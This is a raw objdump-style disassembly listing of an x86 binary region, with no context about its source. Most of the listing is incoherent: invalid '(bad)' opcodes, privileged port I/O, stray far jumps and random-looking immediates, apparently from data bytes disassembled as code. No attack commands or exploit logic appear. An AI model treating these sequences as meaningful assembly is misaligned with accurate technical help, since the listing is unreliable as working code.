  411af8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411af9:	pop    esi
  411afa:	(bad)  
  411afc:	inc    eax
  411afd:	cmp    esi,esi
  411aff:	dec    ecx
  411b00:	ret    0xd45e
  411b03:	das    
  411b04:	outs   dx,DWORD PTR ds:[esi]
  411b05:	dec    ecx
  411b06:	push   eax
  411b07:	pop    bp
  411b09:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  411b0a:	pop    es
  411b0b:	mov    esp,0xb2e123b2
  411b10:	fisub  WORD PTR [ebp+esi*8-0x6a6f0181]
  411b17:	adc    BYTE PTR [edi],cl
  411b19:	inc    edx
  411b1a:	jecxz  0x411b02
  411b1c:	mov    bh,0x4e
  411b1e:	jg     0x411aa6
  411b20:	dec    ebx
  411b21:	mov    esi,0x1cc47aad
  411b26:	mov    eax,ds:0x74d68783
  411b2b:	repz dec ecx
  411b2d:	mov    dl,0xa2
  411b2f:	icebp  
  411b30:	pop    edi
  411b31:	(bad)  
  411b32:	jle    0x411af1
  411b34:	jno    0x411b7f
  411b36:	mov    esi,0x53a68a0a
  411b3b:	sbb    al,0x19
  411b3d:	retf   
  411b3e:	imul   ecx,DWORD PTR [eax],0xae67ef9d
  411b44:	pushf  
  411b45:	sbb    ebx,DWORD PTR [ebp-0x3]
  411b48:	ret    
  411b49:	adc    dl,dl
  411b4b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  411b4c:	jecxz  0x411b63
  411b4e:	dec    esp
  411b4f:	and    ch,0xa6
  411b52:	dec    esp
  411b53:	int3   
  411b54:	lods   eax,DWORD PTR ds:[esi]
  411b55:	pop    ecx
  411b56:	into   
  411b57:	cmc    
  411b58:	push   edx
  411b59:	jle    0x411ba9
  411b5b:	cli    
  411b5c:	inc    eax
  411b5d:	push   es
  411b5e:	pop    esp
  411b5f:	out    0xbe,eax
  411b61:	ror    DWORD PTR [edx-0x15],cl
  411b64:	in     eax,dx
  411b65:	push   edi
  411b66:	aad    0x19
  411b68:	cmp    BYTE PTR [ebp-0x66],ah
  411b6b:	call   0xf4f54c57
  411b70:	sbb    al,0x79
  411b72:	mov    ecx,0xca403276
  411b77:	(bad)  
  411b78:	and    eax,DWORD PTR [edx-0x19472675]
  411b7e:	jmp    0xc9ac8fe1
  411b83:	push   edi
  411b84:	jle    0x411b3c
  411b86:	ins    BYTE PTR es:[edi],dx
  411b87:	xrelease mov BYTE PTR [eax],ch
  411b8a:	jbe    0x411b39
  411b8c:	mov    bl,BYTE PTR [ebp-0x444a60d9]
  411b92:	push   ecx
  411b93:	sub    BYTE PTR ds:0xcbcdf2f3,al
  411b99:	add    BYTE PTR [eax-0x2d],bh
  411b9c:	cdq    
  411b9d:	imul   esi,esp,0xffffffba
  411ba0:	jo     0x411bbb
  411ba2:	and    DWORD PTR [ebx-0x31],ecx
  411ba5:	(bad)  
  411ba8:	inc    edx
  411ba9:	das    
  411baa:	mov    BYTE PTR [eax-0x4b0c7cd8],ah
  411bb0:	pop    es
  411bb1:	dec    esp
  411bb2:	outs   dx,BYTE PTR ds:[esi]
  411bb3:	jb     0x411b6e
  411bb5:	gs ins DWORD PTR es:[edi],dx
  411bb7:	add    cl,ch
  411bb9:	sub    ch,dl
  411bbb:	les    ecx,FWORD PTR [eax]
  411bbd:	jge    0x411c2e
  411bbf:	stc    
  411bc0:	ins    DWORD PTR es:[edi],dx
  411bc1:	ins    DWORD PTR es:[edi],dx
  411bc2:	addr16 adc eax,0xb57fc6a9
  411bc8:	(bad)  
  411bc9:	call   0x9b24:0xca0287ad
  411bd0:	mov    esi,0x44bcdd7f
  411bd5:	and    al,0x86
  411bd7:	xchg   BYTE PTR [edx],al
  411bd9:	ins    DWORD PTR es:[edi],dx
  411bda:	bound  edi,QWORD PTR [ebp+0x79464220]
  411be0:	mov    BYTE PTR [eax-0x3e],bl
  411be3:	jmp    0x411bb3
  411be5:	dec    ebp
  411be6:	add    DWORD PTR [esp+ebp*4-0x51237594],0xfffffffe
  411bee:	xchg   esi,eax
  411bef:	shl    DWORD PTR [esi-0x6ef28240],0x26
  411bf6:	mov    edi,0x666372b7
  411bfb:	pop    ax
  411bfd:	and    edi,edi
  411bff:	sbb    BYTE PTR [eax-0x55e80a7c],0xb0
  411c06:	xchg   ecx,eax
  411c07:	retf   
  411c08:	xchg   ebp,eax
  411c09:	adc    eax,ecx
  411c0b:	jmp    0x411c15
  411c0d:	xor    al,BYTE PTR [ecx]
  411c0f:	mov    ebp,0xd8d39319
  411c14:	aad    0x54
  411c16:	icebp  
  411c17:	lods   eax,DWORD PTR ds:[esi]
  411c18:	xchg   esi,eax
  411c19:	jae    0x411bdc
  411c1b:	int    0x1b
  411c1d:	shl    DWORD PTR [ebp+0x75d02e14],0xa5
  411c24:	mov    ebx,0x2a8f9be9
  411c29:	push   edx
  411c2a:	addr16 cli 
  411c2c:	dec    ebx
  411c2d:	adc    al,0xe9
  411c2f:	mov    al,ds:0xc121ac80
  411c34:	or     DWORD PTR [eax+ecx*8+0x1df2d94f],ebp
  411c3b:	add    al,0xe
  411c3d:	and    eax,0xee443228
  411c42:	push   0x24
  411c44:	xchg   ecx,eax
  411c45:	adc    eax,0x262c76b3
  411c4a:	add    DWORD PTR [eax+ebx*4],ebx
  411c4d:	add    eax,0x84d1ce89
  411c52:	xchg   ebx,eax
  411c53:	call   0x8c97014a
  411c58:	call   0x9bbd7035
  411c5d:	mov    dh,0x95
  411c5f:	xor    al,0x8b
  411c61:	lds    esi,FWORD PTR [ebp-0x7f]
  411c64:	push   ds
  411c65:	pop    edi
  411c66:	inc    ecx
  411c67:	fsubp  st(7),st
  411c69:	sahf   
  411c6a:	push   cs
  411c6b:	and    al,0x17
  411c6d:	push   ebx
  411c6e:	test   ch,0xf9
  411c71:	cdq    
  411c72:	fisubr DWORD PTR [ecx]
  411c74:	inc    ebx
  411c75:	fcom   DWORD PTR [ecx]
  411c77:	adc    edi,ecx
  411c79:	scas   eax,DWORD PTR es:[edi]
  411c7a:	xchg   edx,eax
  411c7b:	es or  edx,edi
  411c7e:	pop    ss
  411c7f:	fimul  DWORD PTR [esi+0x62530f56]
  411c85:	stos   DWORD PTR es:[edi],eax
  411c86:	(bad)  
  411c88:	in     eax,dx
  411c89:	dec    eax
  411c8a:	jne    0x411c64
  411c8c:	aam    0xc6
  411c8e:	pop    edi
  411c8f:	ins    DWORD PTR es:[edi],dx
  411c90:	enter  0x3c62,0x2e
  411c94:	out    0x3,eax
  411c96:	cwde   
  411c97:	sub    ebx,DWORD PTR [eax+0x509b829c]
  411c9d:	stos   BYTE PTR es:[edi],al
  411c9e:	mov    ah,BYTE PTR [esi-0x28e1f472]
  411ca4:	or     cl,0xa6
  411ca7:	daa    
  411ca8:	jmp    0x28802d1f
  411cad:	cmp    eax,0xbbc21db0
  411cb2:	jmp    0xf96ce42a
  411cb7:	xchg   ebp,eax
  411cb8:	pop    ss
  411cb9:	xchg   ecx,eax
  411cba:	retf   
  411cbb:	push   cs
  411cbc:	in     al,dx
  411cbd:	test   BYTE PTR [esi+0x0],ah
  411cc0:	jle    0x411c6d
  411cc2:	mov    esp,DWORD PTR [esi+0x41]
  411cc5:	call   ebx
  411cc7:	sub    al,0x95
  411cc9:	mov    al,ds:0x31449605
  411cce:	lds    ebx,FWORD PTR ds:0xdbb5c7e3
  411cd4:	fsubr  DWORD PTR [esi-0x294aa350]
  411cda:	pop    ebp
  411cdb:	mov    esp,0xe20b6f61
  411ce0:	push   ds
  411ce1:	fsub   QWORD PTR [esi]
  411ce3:	cld    
  411ce4:	or     esi,DWORD PTR [ecx]
  411ce6:	inc    esi
  411ce7:	enter  0x77df,0x35
  411ceb:	sub    ch,al
  411ced:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411cee:	arpl   WORD PTR [ebp+0x3c705608],bx
  411cf4:	popf   
  411cf5:	xlat   BYTE PTR ds:[ebx]
  411cf6:	and    al,bl
  411cf8:	test   al,0x83
  411cfa:	sar    dl,0x96
  411cfd:	das    
  411cfe:	mov    al,0x64
  411d00:	in     eax,dx
  411d01:	stos   BYTE PTR es:[edi],al
  411d02:	or     eax,0xec4bf823
  411d07:	fbstp  TBYTE PTR [ebx-0x269a47dc]
  411d0d:	xchg   esp,eax
  411d0e:	cwde   
  411d0f:	repz inc edi
  411d11:	mov    eax,0xb6ef8e83
  411d16:	(bad)  
  411d17:	mov    ds:0x6662fc4a,al
  411d1c:	and    eax,0x5c4753a4
  411d21:	push   ss
  411d22:	aad    0x1
  411d24:	sub    ah,BYTE PTR [eax-0x34e046d3]
  411d2a:	ss and eax,0x35f691ee
  411d30:	je     0x411d0f
  411d32:	sbb    al,0xcd
  411d34:	cmp    esp,edx
  411d36:	add    ch,bl
  411d38:	clc    
  411d39:	xchg   esp,eax
  411d3a:	mov    eax,ds:0x4c8e5cc5
  411d3f:	idiv   BYTE PTR [edx+0x5c]
  411d42:	jmp    0xf596d831
  411d47:	sbb    ah,al
  411d49:	jo     0x411d3f
  411d4b:	or     BYTE PTR [ebx+edx*2],cl
  411d4e:	cmp    DWORD PTR [ebx+0x1],0x6d
  411d52:	sub    esi,DWORD PTR [ebx]
  411d54:	in     eax,dx
  411d55:	inc    esp
  411d56:	xchg   BYTE PTR [ecx],ch
  411d58:	ins    DWORD PTR es:[edi],dx
  411d59:	push   cs
  411d5a:	mov    ebx,0xd0ff00d7
  411d5f:	jo     0x411d93
  411d61:	js     0x411d1d
  411d63:	pusha  
  411d64:	mov    ebx,0x8f9e423e
  411d69:	pop    ds
  411d6a:	inc    eax
  411d6b:	and    esp,ecx
  411d6d:	push   cs
  411d6e:	jo     0x411d89
  411d70:	mov    ch,0x17
  411d72:	fistp  WORD PTR [ecx]
  411d74:	retf   0x7746
  411d77:	fld    DWORD PTR [edx-0x5d315c3f]
  411d7d:	sti    
  411d7e:	mov    bh,0xba
  411d80:	pop    esp
  411d81:	push   ecx
  411d82:	je     0x411d29
  411d84:	jb     0x411d13
  411d86:	enter  0xef0d,0x12
  411d8a:	pop    edx
  411d8b:	ret    
  411d8c:	add    al,0xad
  411d8e:	imul   esi,DWORD PTR [esi-0x47],0x63aac78a
  411d95:	out    dx,eax
  411d96:	jecxz  0x411d89
  411d98:	jmp    0xb3600fe4
  411d9d:	std    
  411d9e:	aam    0xd3
  411da0:	stc    
  411da1:	mov    al,BYTE PTR [ebx]
  411da3:	outs   dx,DWORD PTR ds:[esi]
  411da4:	mov    BYTE PTR [edx-0x6f283ae1],ch
  411daa:	in     al,dx
  411dab:	loopne 0x411e22
  411dad:	dec    ebp
  411dae:	push   es
  411daf:	jmp    0x411def
  411db1:	jle    0x411de1
  411db3:	hlt    
  411db4:	jmp    0xbe973836
  411db9:	xor    BYTE PTR [edi],dh
  411dbb:	ror    DWORD PTR [ebx-0x3900becb],1
  411dc1:	js     0x411e2e
  411dc3:	and    DWORD PTR [eax+0x19],edx
  411dc6:	(bad)  
  411dc8:	cld    
  411dc9:	in     eax,dx
  411dca:	cmc    
  411dcb:	lea    esp,[edx+0x15]
  411dce:	test   DWORD PTR [ebx+ebp*2-0xc45bad0],ecx
  411dd5:	retf   
  411dd6:	(bad)  [eax]
  411dd8:	jnp    0x411de9
  411dda:	jg     0x411d87
  411ddc:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  411ddd:	mov    esi,0x2200c200
  411de2:	ret    
  411de3:	xor    BYTE PTR [ecx+ebp*1-0x4363c510],ch
  411dea:	xchg   ebx,eax
  411deb:	shl    BYTE PTR [esi+0x69],cl
  411dee:	mov    ds:0x5ee11a8d,al
  411df3:	(bad)  
  411df4:	push   edi
  411df5:	or     DWORD PTR [edx-0x24],ecx
  411df8:	and    al,0xb9
  411dfa:	and    DWORD PTR [ebx],0xa
  411dfd:	ffree  st(3)
  411dff:	push   es
  411e00:	push   ecx
  411e01:	ja     0x411e6e
  411e03:	push   eax
  411e04:	sar    DWORD PTR gs:[eax+0x23e74f07],1
  411e0b:	xor    eax,0x1323158c
  411e10:	mov    eax,0x3d1db98a
  411e15:	cmp    dl,dh
  411e17:	mov    ds:0x87988ace,eax
  411e1c:	sahf   
  411e1d:	jmp    0x303f45c6
  411e22:	or     dl,BYTE PTR [edi+edx*2]
  411e25:	mov    eax,DWORD PTR [esi+0x743b8673]
  411e2b:	inc    edx
  411e2c:	cwde   
  411e2d:	jmp    0xbec9b48d
  411e32:	push   eax
  411e33:	inc    edi
  411e34:	push   es
  411e35:	adc    edx,DWORD PTR [edx-0x7d11c144]
  411e3b:	and    BYTE PTR [ecx],dh
  411e3d:	or     eax,0xe1e70c51
  411e42:	fistp  QWORD PTR [ebx-0x73]
  411e45:	mov    ss,WORD PTR [edi]
  411e47:	mov    eax,ds:0x6b0ba1a2
  411e4c:	push   0x74e27a63
  411e51:	inc    esp
  411e52:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  411e53:	fidivr WORD PTR [edi]
  411e55:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  411e56:	inc    edi
  411e57:	retf   
  411e58:	mov    ds:0x47f0773e,eax
  411e5d:	pop    eax
  411e5e:	mov    ch,0x9a
  411e60:	fldcw  WORD PTR [ebp+0x581e8201]
  411e66:	jno    0x411e11
  411e68:	cmp    DWORD PTR [ebx-0x67],ebp
  411e6b:	pop    es
  411e6c:	inc    edx
  411e6d:	test   al,0xb3
  411e6f:	gs mov ah,0x99
  411e72:	xor    ecx,DWORD PTR [ebx]
  411e74:	out    dx,al
  411e75:	dec    ebp
  411e76:	push   ds
  411e77:	in     al,dx
  411e78:	and    ah,ah
  411e7a:	adc    BYTE PTR [esi],bh
  411e7c:	and    eax,0xa87f1481
  411e81:	jecxz  0x411e75
  411e83:	pop    ebp
  411e84:	adc    DWORD PTR [ebx],ecx
  411e86:	xchg   edi,eax
  411e87:	cmp    al,0x9
  411e89:	or     BYTE PTR [ebx],ah
  411e8b:	test   edx,esp
  411e8d:	lds    eax,FWORD PTR [edi]
  411e8f:	repnz dec ebp
  411e91:	xor    eax,0x8e324cd9
  411e96:	mov    dh,ah
  411e98:	xor    dh,BYTE PTR [ecx+edx*4-0x3a]
  411e9c:	mov    edi,0x1b678590
  411ea1:	cld    
  411ea2:	hlt    
  411ea3:	or     edx,DWORD PTR [edx+0x505adf68]
  411ea9:	sar    esi,1
  411eab:	inc    ecx
  411eac:	dec    ecx
  411ead:	mov    bl,0x84
  411eaf:	mov    eax,ds:0xe81139a6
  411eb4:	stos   DWORD PTR es:[edi],eax
  411eb5:	push   eax
  411eb6:	call   0x6a991094
  411ebb:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  411ebc:	jecxz  0x411f08
  411ebe:	ds out dx,al
  411ec0:	inc    eax
  411ec1:	lods   al,BYTE PTR ds:[esi]
  411ec2:	mov    dl,0x70
  411ec4:	sbb    DWORD PTR [ebx-0x2cc76849],edx
  411eca:	aam    0xd2
  411ecc:	xchg   ecx,eax
  411ecd:	dec    dl
  411ecf:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  411ed0:	imul   edx,DWORD PTR [edx],0xb46ce216
  411ed6:	es (bad) 
  411ed8:	pop    edx
  411ed9:	xchg   esp,eax
  411eda:	xor    al,0x14
  411edc:	fstp   TBYTE PTR [esi]
  411ede:	jbe    0x411eb3
  411ee0:	xor    DWORD PTR [ebx],esi
  411ee2:	and    eax,0x94b5cc41
  411ee7:	dec    ecx
  411ee8:	pop    esi
  411ee9:	xchg   edi,eax
  411eea:	jmp    0x489d:0x93c398ce
  411ef1:	outs   dx,BYTE PTR ds:[esi]
  411ef2:	add    DWORD PTR [eax-0x70],0xffffffc5
  411ef6:	xchg   edi,eax
  411ef7:	dec    esp
  411ef8:	das    
  411ef9:	ins    BYTE PTR es:[edi],dx
  411efa:	in     al,0x29
  411efc:	xchg   ecx,eax
  411efd:	push   ds
  411efe:	dec    edx
  411eff:	add    dl,BYTE PTR [ecx-0x4d]
  411f02:	mov    eax,0x3d034919
  411f07:	push   ss
  411f08:	iret   
  411f09:	pusha  
  411f0a:	add    BYTE PTR [edi+0x8],ah
  411f0d:	mov    ch,0xbe
  411f0f:	jecxz  0x411ed6
  411f11:	mov    ds:0x9f59495c,eax
  411f16:	jne    0x411ede
  411f18:	fiadd  WORD PTR [eax+0x23]
  411f1b:	cmp    BYTE PTR ds:0x291b600,ah
  411f21:	aad    0x66
  411f23:	xchg   esp,eax
  411f24:	shr    BYTE PTR [edx-0x1cc950d9],0xf1
  411f2b:	sub    ecx,DWORD PTR [eax+0x7f2aba63]
  411f31:	jecxz  0x411eca
  411f33:	mov    ecx,0xf5927117
  411f38:	push   edx
  411f39:	sub    ebx,DWORD PTR [esi-0x2f]
  411f3c:	fidivr DWORD PTR [eax+eax*8-0x70]
  411f40:	mov    WORD PTR [eax+0x17],fs
  411f43:	pop    ebx
  411f44:	mov    ds:0x97cee425,eax
  411f49:	retf   
  411f4a:	outs   dx,DWORD PTR ds:[esi]
  411f4b:	pop    edx
  411f4c:	out    dx,eax
  411f4d:	inc    ebx
  411f4e:	cmp    ebx,ecx
  411f50:	(bad)  
  411f51:	push   ebp
  411f52:	mov    al,0x83
  411f54:	dec    ecx
  411f55:	push   eax
  411f56:	and    esi,DWORD PTR [edi+edx*2]
  411f59:	lock fs add al,0x59
  411f5d:	jmp    0x411f25
  411f5f:	sub    DWORD PTR [esi+0x1b],esp
  411f62:	pop    esi
  411f63:	fild   QWORD PTR [esi-0x7b]
  411f66:	cmp    DWORD PTR [edx],eax
  411f68:	mov    edi,0xefc2f938
  411f6d:	mov    cs,eax
  411f6f:	sub    BYTE PTR [esi-0x4206157],ch
  411f75:	ret    
  411f76:	xchg   edi,eax
  411f77:	scas   eax,DWORD PTR es:[edi]
  411f78:	pop    ebp
  411f79:	adc    eax,0x96e8270f
  411f7e:	push   ss
  411f7f:	jge    0x411f27
  411f81:	inc    esi
  411f82:	xchg   ebp,eax
  411f83:	mov    esi,0x28077ffb
  411f88:	test   BYTE PTR [esi-0x25],ah
  411f8b:	mov    eax,0x25cfb065
  411f90:	adc    eax,0xc53922f
  411f95:	inc    ebx
  411f96:	in     al,dx
  411f97:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  411f98:	xor    al,al
  411f9a:	add    BYTE PTR [ecx],dl
  411f9c:	and    al,0x22
  411f9e:	cli    
  411f9f:	jmp    0xd0f9b736
  411fa4:	and    ah,ch
  411fa6:	repnz out dx,eax
  411fa8:	fild   QWORD PTR [edx]
  411faa:	jmp    0x411fec
  411fac:	dec    edx
  411fad:	and    BYTE PTR [esi+edx*8-0x65],0xe0
  411fb2:	push   ebp
  411fb4:	cs ffreep st(6)
  411fb7:	inc    esi
  411fb8:	aam    0x71
  411fba:	inc    ecx
  411fbb:	je     0x411fc6
  411fbd:	shr    BYTE PTR [ebx],cl
  411fbf:	cmp    BYTE PTR [edx+ebp*8],dl
  411fc2:	aad    0x89
  411fc4:	adc    eax,0xe9380545
  411fc9:	mov    cl,0xd
  411fcb:	xchg   ebp,eax
  411fcc:	mov    ch,0x63
  411fce:	dec    si
  411fd0:	fld    TBYTE PTR [eax-0x5]
  411fd3:	dec    esp
  411fd4:	call   FWORD PTR [ecx]
  411fd6:	or     ah,BYTE PTR [ecx-0x76]
  411fd9:	dec    edx
  411fda:	mov    ds:0xb48d9c5e,eax
  411fdf:	ins    DWORD PTR es:[edi],dx
  411fe0:	ret    
  411fe1:	push   esp
  411fe2:	fcmovb st,st(1)
  411fe4:	ins    DWORD PTR es:[edi],dx
  411fe5:	mov    edi,0x4beb3e4d
  411fea:	sub    ch,BYTE PTR [ecx-0xc57cb6b]
  411ff0:	pop    esp
  411ff1:	push   cs
  411ff2:	dec    ebx
  411ff3:	inc    esi
  411ff4:	or     edi,ebx
  411ff6:	dec    esp
  411ff7:	jne    0x412022
  411ff9:	data16 and dh,BYTE PTR [ecx]
  411ffc:	mov    ds:0x9cacfd3a,eax
  412001:	xchg   edi,eax
  412002:	std    
  412003:	sub    eax,0xff213302
  412008:	mov    eax,0x9cca233d
  41200d:	jmp    FWORD PTR [ebp+ecx*2-0x7e]
  412011:	fnsave [eax-0x40020e70]
  412017:	cmp    al,0x0
  412019:	mov    ebp,DWORD PTR [ebx-0x76]
  41201c:	sbb    al,0x8b
  41201e:	adc    eax,edi
  412020:	scas   eax,DWORD PTR es:[edi]
  412021:	jnp    0x411ffb
  412023:	call   0x77211463
  412028:	dec    esi
  412029:	sbb    eax,0xf24fe31d
  41202e:	jle    0x411fd6
  412030:	addr16 aad 0xe6
  412033:	aad    0x8d
  412035:	xor    ebx,eax
  412037:	sar    BYTE PTR [eax+esi*4+0x44],1
  41203b:	adc    eax,0x46cdbe4e
  412040:	mov    dh,0x7e
  412042:	dec    edi
  412043:	je     0x4120b0
  412045:	xchg   esp,eax
  412046:	mov    al,ds:0xcfea46c5
  41204b:	(bad)  
  41204c:	out    dx,eax
  41204d:	mov    al,ds:0xc143a84a
  412052:	mov    ebp,0x39b4ca76
  412057:	xchg   edi,eax
  412058:	in     al,0x2d
  41205a:	in     eax,0x3f
  41205c:	cmp    al,BYTE PTR [ecx-0x214caa3a]
  412062:	ret    0xd561
  412065:	mov    bh,0xed
  412067:	ins    BYTE PTR es:[edi],dx
  412068:	mov    edi,0x398f648
  41206d:	mov    esp,0x78754ed3
  412072:	daa    
  412073:	rdpmc  
  412075:	or     BYTE PTR [ebp-0x52ead7f4],ch
  41207b:	mov    ah,0xaa
  41207d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41207e:	sbb    al,0x3
  412080:	adc    DWORD PTR [ebx+edi*1],ecx
  412083:	jae    0x4120a0
  412085:	ins    DWORD PTR es:[edi],dx
  412086:	adc    eax,0x761498
  41208b:	adc    eax,0x6627b85b
  412090:	int    0xf5
  412092:	sahf   
  412093:	dec    esp
  412094:	into   
  412095:	inc    BYTE PTR [ecx+0x4c090d99]
  41209b:	jecxz  0x412104
  41209d:	mov    edi,0xe50f933b
  4120a2:	mov    DWORD PTR [ebx],eax
  4120a4:	iret   
  4120a5:	scas   eax,DWORD PTR es:[edi]
  4120a6:	aam    0xf8
  4120a8:	sbb    al,0xc0
  4120aa:	loope  0x41205d
  4120ac:	jmp    0x412118
  4120ae:	cmp    al,0xc9
  4120b0:	imul   esp,DWORD PTR [ebx-0x2b5dcf62],0x4d99beb4
  4120ba:	aaa    
  4120bb:	mov    al,ds:0x53ad849c
  4120c0:	sub    eax,0x7dde5a0f
  4120c5:	pop    esi
  4120c6:	nop
  4120c7:	or     esp,DWORD PTR [ecx+0x719f8c54]
  4120cd:	mov    cl,0xa2
  4120cf:	add    eax,edx
  4120d1:	jnp    0x41207f
  4120d3:	and    DWORD PTR [edx-0x5d4b8f9f],esi
  4120d9:	xor    BYTE PTR [edi-0x7866d7ff],0xb2
  4120e0:	test   BYTE PTR [esi-0x2f0a1f60],cl
  4120e6:	jmp    0xfe55:0x5676d7bc
  4120ed:	cld    
  4120ee:	in     eax,0x6c
  4120f0:	add    al,0x1e
  4120f2:	xchg   ebp,eax
  4120f3:	scas   eax,DWORD PTR es:[edi]
  4120f4:	in     eax,dx
  4120f5:	ja     0x412129
  4120f7:	or     al,0xfa
  4120f9:	loopne 0x412094
  4120fb:	mov    esi,0x601bb4d7
  412100:	outs   dx,DWORD PTR ds:[esi]
  412101:	xchg   ecx,eax
  412102:	lock outs dx,DWORD PTR ds:[esi]
  412104:	push   cs
  412105:	xchg   BYTE PTR [ebx],ch
  412107:	ds jno 0x412112
  41210a:	aaa    
  41210b:	leave  
  41210c:	and    al,0xa8
  41210e:	sbb    DWORD PTR [edx+0x40],esi
  412111:	repnz lods al,BYTE PTR ds:[esi]
  412113:	and    DWORD PTR [ecx+ebp*4+0x7c],ebx
  412117:	push   ss
  412118:	adc    al,0x9b
  41211a:	mov    ecx,0x768b5ccd
  41211f:	cdq    
  412120:	call   0x8635:0x19680f99
  412127:	mov    eax,ds:0x62b3f57c
  41212c:	jge    0x412106
  41212e:	adc    al,0xbe
  412130:	fisubr WORD PTR [eax+0x45]
  412133:	push   esi
  412134:	inc    ebx
  412135:	push   ebx
  412136:	jge    0x412160
  412138:	mov    bh,0x9b
  41213a:	sbb    al,0xa4
  41213c:	xchg   edi,eax
  41213d:	loop   0x41211e
  41213f:	outs   dx,BYTE PTR ds:[esi]
  412140:	xor    edi,DWORD PTR [edx+ecx*1]
  412143:	push   eax
  412144:	xchg   BYTE PTR [edi+0x22],bl
  412147:	and    DWORD PTR [ebp+eax*4+0x6f087621],ebp
  41214e:	mov    bl,0xc4
  412150:	xor    edi,DWORD PTR [edi+0x5]
  412153:	xor    DWORD PTR [eax-0x3a3ec956],esi
  412159:	mov    dl,BYTE PTR [edx-0x24f4b3ea]
  41215f:	inc    esp
  412160:	push   ecx
  412161:	mov    ch,bh
  412163:	lds    esp,FWORD PTR [ebx+eax*2]
  412166:	xor    al,0x6b
  412168:	retf   0xd688
  41216b:	fs dec esp
  41216d:	sahf   
  41216e:	sbb    dh,BYTE PTR [edx-0x4ec62785]
  412174:	dec    esp
  412175:	xchg   esi,ebp
  412177:	adc    edi,ebp
  412179:	in     eax,0xc7
  41217b:	sahf   
  41217c:	arpl   WORD PTR [edi-0x4ac618d5],bp
  412182:	ret    0x4ffc
  412185:	jle    0x41218c
  412187:	adc    eax,DWORD PTR [ebx+0x43]
  41218a:	(bad)  
  41218b:	lods   al,BYTE PTR ds:[esi]
  41218c:	jmp    0x9e6:0xfb67fcc5
  412193:	fs jle 0x412159
  412196:	jbe    0x412177
  412198:	cmp    BYTE PTR [ebp-0x71],ah
  41219b:	jbe    0x4121f8
  41219d:	mov    esp,0x4f315e00
  4121a2:	ins    BYTE PTR es:[edi],dx
  4121a3:	mov    ecx,0xa39bd032
  4121a8:	js     0x412207
  4121aa:	or     eax,0x6593aafb
  4121af:	and    ecx,eax
  4121b1:	scas   al,BYTE PTR es:[edi]
  4121b2:	mov    bh,0x4f
  4121b4:	shr    bl,0x14
  4121b7:	xchg   esp,eax
  4121b8:	pop    esi
  4121b9:	push   cs
  4121ba:	xchg   ebx,eax
  4121bb:	xor    DWORD PTR [ecx+0x1],edx
  4121be:	imul   edi,DWORD PTR [ebx],0x30
  4121c1:	cmp    al,0xb
  4121c3:	cmp    DWORD PTR [esi+0x75381651],ecx
  4121c9:	push   0xbc2f2650
  4121ce:	cmp    DWORD PTR [ecx+0x34ed90b8],esi
  4121d4:	inc    eax
  4121d5:	call   0x1bc2bf8a
  4121da:	fild   DWORD PTR [ecx]
  4121dc:	add    esp,ebp
  4121de:	(bad)  
  4121df:	cmp    dh,BYTE PTR [eax]
  4121e1:	sub    DWORD PTR [eax+0x3734904b],edi
  4121e7:	retf   
  4121e8:	sub    DWORD PTR ds:[ebp+0x6b],ebp
  4121ec:	cmc    
  4121ed:	pop    es
  4121ee:	push   esp
  4121ef:	fisttp QWORD PTR [ecx]
  4121f1:	pop    esi
  4121f2:	push   ebp
  4121f3:	hlt    
  4121f4:	mov    DWORD PTR [ebp+eiz*8+0x39c0ded7],edx
  4121fb:	jp     0x412244
  4121fd:	bt     DWORD PTR [ebx-0x51],ebp
  412201:	aam    0xe2
  412203:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  412204:	out    0xb2,eax
  412206:	pop    eax
  412207:	push   esi
  412208:	js     0x412213
  41220a:	lahf   
  41220b:	cs dec esp
  41220d:	js     0x4121da
  41220f:	outs   dx,DWORD PTR ds:[esi]
  412210:	call   0x194480a8
  412215:	mov    ebx,ecx
  412217:	loop   0x4121df
  412219:	(bad)  
  41221b:	aad    0x4d
  41221d:	dec    edi
  41221e:	push   ds
  41221f:	daa    
  412220:	(bad)  
  412221:	stc    
  412222:	jmp    0x2807:0x11f0f104
  412229:	in     eax,0x68
  41222b:	mov    ah,0x28
  41222d:	sbb    BYTE PTR [edx],0xda
  412230:	sub    eax,0xc393e528
  412235:	dec    ebp
  412236:	(bad)  
  412237:	push   0xf86b7887
  41223c:	fninit 
  41223e:	push   0xffffff98
  412240:	pop    eax
  412241:	stos   DWORD PTR es:[edi],eax
  412242:	(bad)  [eax+0x8b2492]
  412248:	and    ah,cl
  41224a:	clc    
  41224b:	out    0x2e,eax
  41224d:	into   
  41224e:	aad    0x12
  412250:	call   DWORD PTR [ecx+ebx*8-0x710380a2]
  412257:	and    DWORD PTR [eax+0x14],esi
  41225a:	call   DWORD PTR [edx]
  41225c:	std    
  41225d:	push   eax
  41225e:	(bad)  
  41225f:	xor    esp,DWORD PTR ds:0x5fdadfcb
  412265:	or     ebp,edx
  412267:	outs   dx,DWORD PTR ds:[esi]
  412268:	imul   esi,DWORD PTR [ecx],0x792c6869
  41226e:	add    al,0x63
  412270:	mov    dh,0xd7
  412272:	cwde   
  412273:	fcomip st,st(5)
  412275:	in     eax,dx
  412276:	(bad)  
  412277:	adc    al,0xe9
  412279:	ret    
  41227a:	mov    esp,edx
  41227c:	inc    ecx
  41227d:	jnp    0x41229f
  41227f:	push   ds
  412280:	mov    eax,0xd28dc8c6
  412285:	cwde   
  412286:	ds mov ah,0xed
  412289:	sub    BYTE PTR [ebx+esi*4],cl
  41228c:	lds    ebp,FWORD PTR [eax+0x636a5bdf]
  412292:	retf   0xe75b
  412295:	mov    esp,0x131f6f61
  41229a:	xor    esp,edx
  41229c:	inc    ebx
  41229d:	jg     0x41226b
  41229f:	mov    al,0x7
  4122a1:	repnz xchg edx,eax
  4122a3:	sub    BYTE PTR [edx+0x128d6b7c],dl
  4122a9:	sti    
  4122aa:	mov    dh,0xa1
  4122ac:	mov    al,ds:0xe8b05aad
  4122b1:	sbb    DWORD PTR [esi+ebx*8-0x66cf7d51],edi
